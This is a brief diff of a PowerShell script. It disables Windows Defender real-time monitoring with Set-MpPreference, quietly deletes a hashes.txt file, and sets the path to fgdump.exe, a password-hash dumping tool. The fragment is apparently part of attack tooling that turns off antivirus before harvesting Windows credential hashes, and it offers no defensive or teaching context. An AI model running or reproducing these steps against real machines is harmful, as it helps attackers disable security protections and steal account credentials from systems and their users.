@@ -1,6 +1,9 @@
 # Disable Windows defender
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+#Delete hashes.txt
+Remove-Item hashes.txt -ErrorAction SilentlyContinue
+
 # Location of fgdump
 $exeloc = "$PSScriptRoot\fgdump.exe"
 
